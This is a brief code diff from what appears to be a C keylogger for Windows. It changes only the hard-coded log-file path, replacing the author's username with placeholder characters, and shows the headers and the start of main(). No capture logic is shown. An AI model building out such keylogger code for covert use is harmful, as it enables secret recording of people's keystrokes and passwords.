@@ -2,7 +2,7 @@
 #include <conio.h>
 #include <windows.h>
 #include <time.h>
-#define PATH "C:/Users/romain/Documents/keylogger/log.txt" // The path to the log file
+#define PATH "C:/Users/xxxxxx/Documents/keylogger/log.txt" // The path to the log file
 
 int main(){
     char capture;
